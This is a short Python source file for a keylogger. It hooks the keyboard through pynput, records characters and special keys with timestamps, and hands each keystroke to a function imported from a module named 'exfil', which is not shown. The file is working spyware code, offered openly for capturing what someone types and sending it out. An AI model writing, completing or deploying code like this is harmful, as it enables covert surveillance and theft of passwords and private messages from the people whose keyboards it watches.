from pynput import keyboard
from exfil import send_keystroke
from datetime import datetime

# Process and exfil one key

def process_key(key):
    try:
        if hasattr(key, 'char') and key.char:
            raw = key.char
        elif key == keyboard.Key.space:
            raw = " "
        elif key == keyboard.Key.enter:
            raw = "[ENTER]"
        elif key == keyboard.Key.tab:
            raw = "[TAB]"
        elif key == keyboard.Key.backspace:
            raw = "[BACKSPACE]"
        elif key == keyboard.Key.esc:
            print("[x] ESC pressed. Exiting.")
            return False  # Will stop listener
        else:
            return  # Ignore unsupported keys

        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        send_keystroke(raw,timestamp)

    except Exception as e:
        print("[!] Error in process_key:", e)

def on_press(key):
    result = process_key(key)
    if result is False:
        return False  # ESC exits

def on_release(key):
    pass  # You can use this if needed

# Start keylogger listener
if __name__ == "__main__":
    print("[+] Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
